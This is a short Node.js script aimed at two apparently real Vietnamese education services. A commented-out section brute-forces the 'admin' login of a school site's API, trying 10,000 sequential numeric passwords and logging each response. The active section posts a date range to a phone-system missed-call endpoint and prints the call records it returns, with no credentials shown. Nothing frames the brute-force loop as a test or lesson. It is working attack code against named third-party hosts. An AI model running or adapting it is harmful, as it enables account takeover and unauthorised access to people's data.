var request = require('request');
var fs = require('fs');

// async function postRequest(username, pass) {
//     return new Promise(resolve => {
//         var myJSONObject = { "UserName": username, "PassWord": pass, "SchoolId": 1 };
//         request({
//             url: "https://senglish.yodovn.com/api/v1/yodose/login",
//             method: "POST",
//             json: true,   // <--Very important!!!
//             body: myJSONObject
//         }, function (error, response, body) {
//             resolve(response);
//         });
//     });
// }
// async function asyncCall() {
//     for (var i = 0; i < 10000; i++) {
//         var username = "admin";
//         var pass = 10000000 + i;
//         var respon = await postRequest(username, pass);
//         utils.writeLog(username + "\t" + pass + " -> " + respon.body.Message);
//     }
// }
// asyncCall();


async function postRequest() {
    return new Promise(resolve => {
        var myJSONObject = {
            "begin": "2019-10-17 12:00:00",
            "end": "2019-10-17 15:00:00"
        };
        request({
            url: "https://pbx.edupia.vn:8777/api/misscall.php",
            method: "POST",
            json: true,   // <--Very important!!!
            body: myJSONObject
        }, function (error, response, body) {
            if(error) console.log(error);
            resolve(response);
        });
    });
}
async function asyncCall() {

    var respon = await postRequest();
    console.log(respon.body);

}
asyncCall();
